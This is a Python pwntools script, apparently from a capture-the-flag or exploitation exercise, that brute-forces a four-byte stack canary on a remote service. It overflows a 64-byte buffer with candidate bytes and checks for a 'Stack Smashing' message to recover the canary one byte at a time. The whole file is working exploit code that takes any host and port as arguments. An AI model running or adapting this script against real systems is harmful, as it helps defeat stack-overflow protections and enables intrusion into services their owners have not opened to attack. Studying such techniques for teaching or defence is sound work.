#!/usr/bin/env python3

import argparse
from pwn import remote, context

def main():
  # Suppress Pwntools debug output
  context.log_level = 'error'

  # Parse command-line arguments
  parser = argparse.ArgumentParser(description="Canary Brute-Force Exploit Script using Pwntools")
  parser.add_argument("host", type=str, help="Hostname or IP address to connect to")
  parser.add_argument("port", type=int, help="Port number of the service to connect to")
  args = parser.parse_args()

  buffer_size = 64      # Size of the buffer
  canary_length = 4       # Length of the canary in bytes
  canary_found = b''      # Bytes of the canary that have been found

  # Calculate the total length to send (buffer + canary)
  total_length = buffer_size + canary_length
  length = f"{total_length}\n".encode()

  # Iterate over each byte of the canary
  for byte_index in range(canary_length):
    for byte_val in range(0, 256):
      try:
        # Construct the payload for this iteration
        padding = b'A' * buffer_size            # Buffer padding
        candidate_canary = canary_found + bytes([byte_val])   # Current canary bytes + candidate byte
        remaining_padding = b'A' * (canary_length - len(canary_found) - 1)  # Padding for remaining canary bytes
        payload = padding + candidate_canary + remaining_padding + b'\n'

        # Establish a connection to the remote service
        with remote(args.host, args.port) as conn:
          # Receive the initial prompt
          conn.recvuntil(b"> ", timeout=5)

          # Send the total length
          conn.send(length)

          # Receive the prompt to send the payload
          conn.recvuntil(b"> ", timeout=5)

          # Send the payload
          conn.send(payload)

          # Receive the response
          response = conn.recvall(timeout=5)

        # Check if the response does not contain "Stack Smashing"
        if b"Stack Smashing" not in response:
          canary_found += bytes([byte_val])      # Append the found byte to the canary
          print(f"value found: {byte_val}")
          break  # Move to the next byte of the canary

      except:
        # In case of any exception (e.g., timeout), continue to the next byte value
        continue

  # Optional: Print the full canary in hexadecimal format
  # print(f"Full canary found: {canary_found.hex()}")

if __name__ == "__main__":
  main()
